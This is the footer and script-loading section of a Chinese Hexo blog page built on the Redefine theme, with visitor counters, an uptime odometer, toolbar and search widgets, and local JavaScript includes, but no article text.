            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">访问人数</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">总访问量</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>








    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>